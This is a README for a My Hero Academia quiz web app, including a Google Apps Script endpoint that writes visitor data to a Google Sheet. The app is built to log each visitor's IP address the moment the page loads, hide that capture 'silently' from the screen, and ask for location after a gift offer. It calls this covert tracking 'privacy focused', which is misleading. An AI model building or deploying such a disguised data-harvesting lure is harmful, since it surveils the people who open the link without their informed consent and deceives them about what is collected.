# My Hero Academia - Ultimate Hero Quiz 🦸‍♂️

A super interactive and aesthetic quiz application about My Hero Academia with real-time progressive tracking, geolocation, Google Sheets integration, and stunning MHA background images!

---

## 🚀 Quick Start (30 Seconds!)

### Option 1: One-Click Start (Windows)
```bash
# Double-click this file in your project folder:
START_QUIZ.bat
```

### Option 2: Manual Start
```bash
npm install  # First time only
npm run dev
```

Then open your browser to: **http://localhost:5173**

---

## ✨ Features

✅ **10 MHA Quiz Questions** - Test your knowledge about heroes, quirks, and U.A. High School  
✅ **Real-Time Tracking** - Tracks visitors immediately upon page load (no data loss!)  
✅ **Progressive Data Saving** - Updates Google Sheets at every step (Page Load → Start → Finish → Location)  
✅ **Privacy Focused** - IP and Location are captured silently (not displayed on screen)  
✅ **Geolocation API** - Requests user location after quiz completion  
✅ **Gift Offering** - Shows 5 MHA goodies as rewards  
✅ **MHA Background Images** - Custom backgrounds on all 4 screens  
✅ **Premium Design** - Glassmorphism, gradients, smooth animations  
✅ **Hero Ranking System** - Symbol of Peace, Pro Hero, Hero in Training, Aspiring Hero  

---

## 📊 Google Sheets Setup (Progressive Tracking)

This app tracks users at **every step**. Follow these instructions to set up the data collection.

### 1. Create Google Sheet Headers
Create a new Google Sheet and add these **7 headers** in Row 1:

| A | B | C | D | E | F | G |
|---|---|---|---|---|---|---|
| **Session ID** | **Name** | **IP Address** | **Score** | **Location** | **Stage** | **Timestamp** |

### 2. Add Google Apps Script
1. In your sheet, go to **Extensions** > **Apps Script**.
2. Paste this code:

```javascript
function doPost(e) {
  try {
    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
    var data = JSON.parse(e.postData.contents);
    
    // Append new row for each update
    sheet.appendRow([
      data.sessionId || 'N/A',
      data.name || 'Not entered yet',
      data.ip || 'Unknown',
      data.score || 'Not completed',
      data.location || 'Not provided',
      data.stage || 'unknown',
      data.timestamp || new Date().toISOString()
    ]);
    
    return ContentService.createTextOutput(JSON.stringify({
      'status': 'success'
    })).setMimeType(ContentService.MimeType.JSON);
    
  } catch(error) {
    return ContentService.createTextOutput(JSON.stringify({
      'status': 'error',
      'message': error.toString()
    })).setMimeType(ContentService.MimeType.JSON);
  }
}

function doGet(e) {
  return ContentService.createTextOutput('MHA Quiz tracking endpoint active!');
}
```

### 3. Deploy
1. Click **Deploy** > **New deployment**.
2. Select type: **Web app**.
3. Description: "MHA Quiz v2".
4. Execute as: **Me**.
5. Who has access: **Anyone** (Important!).
6. Click **Deploy** and copy the URL.
7. Paste the URL in `src/App.jsx` (search for `your-script-url` or the `fetch` call).

---

## 🎨 Background Images

The app uses custom MHA images located in `src/assets`.

- **Welcome**: `my-hero-academia-world-heroes-mission...webp`
- **Quiz**: `my-hero-academia-ipad...webp`
- **Result**: `bakugou-aesthetic...webp`
- **Gift**: `deku-phone-wallpaper...webp`

**To Change Images:**
1. Place new images in `src/assets`.
2. Update imports in `src/App.jsx`.

---

## 🔍 How to Monitor Data

Since the app uses **progressive tracking**, you will see multiple rows for the same user (matching **Session ID**):

1. **page_load**: Instant row as soon as they open the link (IP captured).
2. **quiz_started**: When they enter their name.
3. **quiz_completed**: When they finish (Score captured).
4. **location_granted/denied**: Final status with coordinates.

This ensures you never lose data even if a user leaves halfway through!

---

## 🐛 Troubleshooting

### Data Not Saving?
1. Check if specific columns in Google Sheet match the 7 headers above.
2. Verify Apps Script "Who has access" is set to "**Anyone**".
3. Check browser console (F12) for "Data sent to Google Sheets successfully!".

### IP/Location Not Showing on Screen?
**This is intentional.** To improve privacy and aesthetics, we hide raw data from the user interface but still capture it in the background for your sheet.

---

**PLUS ULTRA!** 💪
